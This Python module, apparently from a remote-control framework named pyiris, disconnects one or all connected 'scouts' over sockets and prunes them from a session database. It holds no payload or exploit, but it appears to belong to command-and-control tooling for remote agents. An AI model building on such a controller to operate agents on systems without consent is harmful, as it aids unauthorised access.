# API
# done
import socket
import pyiris_api.library.modules.send_all as send_all
import pyiris_api.library.modules.recv_all as recv_all


def main(self, scout_id):
    try:
        if scout_id == 'all':
            warning = False
            for i in list(self.config.scout_database.keys()):
                try:
                    self.log.inf('Disconnecting scout of ID : ' + i)
                    send_all.main(self.config.scout_database[i]["conn_object"], 'disconnect')
                    data = recv_all.main(self.config.scout_database[i]["conn_object"])
                    self.log.blank(data)
                    try:
                        del (self.config.scout_database[i])
                        self.config.change = True
                    except IndexError:
                        self.log.err('Scout does not exist in database!')
                except socket.error:
                    try:
                        self.log.war('Scout is dead, removing from database...')
                        warning = True
                        del (self.config.scout_database[i])
                        self.config.change = True
                    except IndexError:
                        self.log.err('Scout does not exist in database!')
            if warning:
                return {"status": "warning", "message": "Successfully disconnected scouts. 1 or more scouts were already dead", "data": {"scout_database": self.config.scout_database}}
            else:
                return {"status": "ok", "message": "Successfully disconnected scouts", "data": {"scout_database": self.config.scout_database}}
        else:
            self.log.inf('Disconnecting scout of ID : ' + scout_id)
            send_all.main(self.config.scout_database[scout_id]["conn_object"], 'disconnect')
            data = recv_all.main(self.config.scout_database[scout_id]["conn_object"])
            self.log.blank(data)
            try:
                del (self.config.scout_database[scout_id])
                self.config.change = True
            except IndexError:
                self.log.err('Scout does not exist in database!')
            return {"status": "ok", "message": "Successfully disconnected scout", "data": {"scout_database": self.config.scout_database}}
    except (IndexError, KeyError):
        self.log.err('Please enter a valid scout ID')
        return {"status": "error", "message": "Please enter a valid scout ID", "data": None}
    except socket.error:
        try:
            self.log.war('Scout is dead, removing from database...')
            del (self.config.scout_database[scout_id])
            self.config.change = True
        except IndexError:
            self.log.err('Scout does not exist in database!')
        return {"status": "warning", "message": "Scout is already dead", "data": {"scout_database": self.config.scout_database}}